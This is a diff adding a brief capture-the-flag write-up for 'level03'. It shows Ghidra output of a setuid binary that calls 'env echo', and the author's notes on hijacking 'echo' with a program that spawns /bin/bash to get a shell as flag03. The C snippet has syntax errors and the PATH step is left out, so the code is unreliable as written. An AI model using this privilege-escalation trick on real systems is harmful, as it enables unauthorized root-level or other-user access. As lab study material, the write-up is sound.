@@ -1,0 +1,46 @@
+level03:
+
+external software used:
+	- Ghidra
+
+Ghidra decompiler result:
+
+int main(int argc,char **argv,char **envp)
+
+{
+  __gid_t __rgid;
+  __uid_t __ruid;
+  int iVar1;
+  gid_t gid;
+  uid_t uid;
+  
+  __rgid = getegid();
+  __ruid = geteuid();
+  setresgid(__rgid,__rgid,__rgid);
+  setresuid(__ruid,__ruid,__ruid);
+  iVar1 = system("/usr/bin/env echo Exploit me");
+  return iVar1;
+}
+
+observations:
+
+-	level03 has flag03 set as group?
+	seeing group/user is set to "effective" uid, this process probably runs as flag03
+
+-	level03 runs /usr/bin/env echo ... as flag03
+
+try changing /usr/bin/env:
+	permission denied
+try changing /bin/echo:
+	permission denied
+
+try creating a new program with source:
+
+#include <stdlib>
+int main(void) { system("/bin/bash") return 0; }
+
+compile, name it as "echo"
+
+run level03,
+we now have shell as flag03
+
